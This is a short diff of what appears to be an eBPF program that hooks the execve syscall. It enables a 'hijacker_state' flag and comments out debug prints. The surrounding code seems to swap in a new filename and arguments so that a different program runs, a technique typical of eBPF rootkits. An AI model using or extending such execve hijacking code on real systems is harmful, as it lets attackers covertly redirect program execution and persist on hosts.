@@ -124,7 +124,7 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
     bpf_printk("ARGV1: %s\n", argv[1]);
     bpf_printk("ARGV2: %s\n", argv[2]);
     //bpf_printk("ENVP: %s\n", envp);
-    bpf_printk("FILENAME: %s\n", filename);
+    bpf_printk("FILENAME: %s\n", filename);*/
     bpf_printk("&FILE: %llx, &ARGV0: %llx, &ARGV1: %llx\n", (void*)(ctx->filename), (void*)&(ctx->argv[0]), (void*)&(ctx->argv[1]));
     //bpf_printk("&ARGV: %llx, &ARGV0: %llx\n", ctx->argv, argv[0]);
     if((void*)ctx->filename==(void*)(ctx->argv)){
@@ -218,7 +218,7 @@ static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ct
         bpf_printk("Error reading 1\n");
     };
 
-    //hijacker_state = 1;
+    hijacker_state = 1;
 
     bpf_printk("SUCCESS NEW FILENAME: %s\n", newfilename);
     bpf_printk("NEW ARGV0: %s\n\n", newargv[0]);
